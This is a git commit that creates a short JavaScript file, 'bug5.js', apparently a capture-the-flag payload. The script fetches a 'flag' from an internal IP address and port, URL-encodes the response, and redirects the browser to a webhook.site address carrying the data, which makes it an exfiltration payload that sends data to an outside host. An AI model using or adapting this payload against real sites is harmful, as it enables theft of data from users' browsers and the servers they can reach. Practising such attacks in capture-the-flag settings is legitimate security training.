d84366f2998600eb2c4b5590754195a12adc86ba
Nelson <78611909+nelsondurairaj@users.noreply.github.com>
2023-03-16 17:43:10 +0530

    Create

---
+++ bug5.js
@@ -0,0 +1,16 @@
+async function sendFlagToWebhook(webhookUrl) {
+  try {
+    const response = await fetch('165.232.190.5:1900/flag');
+    const data = await response.text();
+    console.log(data);
+
+    const encodedData = encodeURIComponent(data);
+    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;
+
+    document.location = urlWithQueryParams;
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+
+sendFlagToWebhook('https://webhook.site/0b1490ed-460d-41fa-b4dd-b13cdaf440bc');
